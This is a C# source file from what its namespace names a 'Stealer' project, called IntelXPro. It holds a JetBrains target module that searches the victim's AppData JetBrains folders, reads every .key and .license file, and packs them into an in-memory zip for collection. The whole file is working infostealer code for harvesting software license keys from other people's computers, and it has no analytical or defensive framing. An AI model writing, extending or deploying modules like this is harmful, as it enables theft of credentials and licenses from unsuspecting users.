using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class JetBrains : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] allowedExtensions = new string[2] { ".key", ".license" };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "JetBrains";
            Parallel.ForEach(Directory.GetDirectories(path), delegate (string apps)
            {
                Parallel.ForEach(Directory.GetFiles(apps), delegate (string file)
                {
                    if (allowedExtensions.Contains(Path.GetExtension(file)))
                    {
                        string text = "JetBrains\\" + Path.GetFileName(apps) + "\\" + Path.GetFileName(file);
                        zip.AddFile(text, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + text);
                    }
                });
            });
            if (counterApplications.Files.Count() > 0)
            {
                counterApplications.Files.Add("JetBrains\\");
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
